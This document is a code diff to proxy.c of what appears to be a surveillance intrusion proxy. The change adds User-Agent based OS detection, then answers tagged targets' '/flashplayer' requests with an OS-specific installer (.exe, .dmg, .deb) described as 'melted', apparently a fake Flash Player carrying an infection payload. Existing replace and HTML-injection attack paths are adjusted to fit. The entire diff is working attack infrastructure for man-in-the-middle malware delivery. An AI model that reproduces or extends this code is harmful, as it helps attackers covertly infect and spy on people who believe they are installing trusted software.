@@ -6,6 +6,7 @@
     $Id: proxy.c 3558 2011-06-07 10:59:30Z alor $
 */
 
+#define _GNU_SOURCE
 #include <main.h>
 #include <proxy.h>
 #include <threads.h>
@@ -23,6 +24,7 @@
 
 /* protos */
 
+osuser search_useragent(char *request);
 void proxy_start(void);
 MY_THREAD_FUNC(proxy);
 MY_THREAD_FUNC(handle_connection);
@@ -30,6 +32,25 @@ void mangle_request(char *request, char *request_end);
 int remote_BIOseek(const char *host, const char *resource, size_t offset, BIO **sbio, char *request);
 
 /************************************************/
+
+osuser
+search_useragent(char *request)
+{
+   osuser os = UNKNOWN;
+
+   if (strstr(request, "User-Agent: ") != NULL) {
+      char *user = strstr(request, "User-Agent:");
+
+      if (strstr(user, "Windows NT") != NULL || strstr(user, "Windows") != NULL || strstr(user, "Win") != NULL)
+         os = WINDOWS;
+      else if (strstr(user, "OS X") != NULL || strstr(user, "Mac") != NULL)
+         os = OSX;
+      else if (strstr(user, "Linux") != NULL || strstr(user, "linux") != NULL || strstr(user, "Ubuntu") != NULL)
+         os = LINUX;
+   }
+
+   return os;
+}
 
 void proxy_start(void)
 {
@@ -103,6 +124,7 @@ MY_THREAD_FUNC(handle_connection)
    char *p, *q;
    struct request_node *req;
    struct timeval tvs, tve, tvt;
+   osuser os;
 
    gettimeofday(&tvs, NULL);
 
@@ -185,10 +207,10 @@ MY_THREAD_FUNC(handle_connection)
    if ((p = strrchr(rsrc, '/')) != NULL)
       p = strrchr(rsrc, '/');
 
-
    /*
     * search the tag in the list.
     *   - if we have a tag and a local file matching the request, then serve the local file
+    *   - if we have a tag<->type association and the url request matching the /flashplayer, then serve the correct flash player melted
     *   - if we have no local file and we have tag<->url association, we know how to infect the target
     *   - if we have only a tag, do nothing and simply proxy the connection
     *   - if we have no tag, then close the connection preventing the use of IPA as open proxy
@@ -200,8 +222,56 @@ MY_THREAD_FUNC(handle_connection)
          DEBUG_MSG(D_INFO, "Serving local file: [%s]", p);
 
          /* read from the file & close the handle */
-         proxy_replace(&cbio, &sbio, p, req->tag, host, ip, url);
+         proxy_replace(&cbio, &sbio, p, req->tag, req->type, host, ip, url);
          fclose(fl);
+   } else if (((req = request_find_type(tag, REQ_TYPE_INJECT_HTML_FLASH)) != NULL) && 
+             p && strlen(p) && /* file name has a length */
+             ! strcmp(p, "flashplayer")) {
+         char *correct_file = NULL;
+	 int ret = 0;
+
+	 os = search_useragent(request);
+         switch (os) {
+         case WINDOWS:
+            ret = asprintf(&correct_file, "%s.exe", req->path);
+            break;
+
+         case OSX:
+            ret = asprintf(&correct_file, "%s.dmg", req->path);
+            break;
+
+         case LINUX:
+            ret = asprintf(&correct_file, "%s.deb", req->path);
+            break;
+
+         case UNKNOWN:
+            break;
+         }
+
+         if (ret == -1)
+            DEBUG_MSG(D_ERROR, "Flash Player allocation failed");
+
+         if (os != UNKNOWN) {
+            fl = open_data("vectors", correct_file, FOPEN_READ_BIN);
+            ON_ERROR(fl, NULL, "Cannot open %s", correct_file);
+
+            DEBUG_MSG(D_INFO, "Serving local file: [%s]", correct_file);
+
+            /* read from the file & close the handle */
+            proxy_replace(&cbio, &sbio, correct_file, req->tag, REQ_TYPE_INJECT_HTML_FLASH, host, ip, url);
+            fclose(fl);
+
+            free(correct_file);
+         } else {
+            DEBUG_MSG(D_ERROR, "ERROR: OS detected not supported, cannot attack !!");
+            DEBUG_MSG(D_ERROR, "Tag found [%s], proxying the connection to [%s]...", tag, url);
+            /*
+             * no OS was matched, but a tag was found
+             * we have to remove it and proxy the connection
+             */
+            mangle_request(request, request_end);
+            proxy_null(&cbio, &sbio, request);
+         }
    }
    else if ((req = request_find(tag, url)) != NULL) {
       DEBUG_MSG(D_INFO, "Connection from target [%s][%s], preparing the attack...", tag, url);
@@ -236,7 +306,7 @@ MY_THREAD_FUNC(handle_connection)
          case REQ_TYPE_REPLACE:
             DEBUG_MSG(D_INFO, "Replace attack");
             /* replace the page with a local one */
-            proxy_replace(&cbio, &sbio, req->path, req->tag, host, ip, url);
+            proxy_replace(&cbio, &sbio, req->path, req->tag, req->type, host, ip, url);
             break;
 
         case REQ_TYPE_INJECT_HTML_FILE:
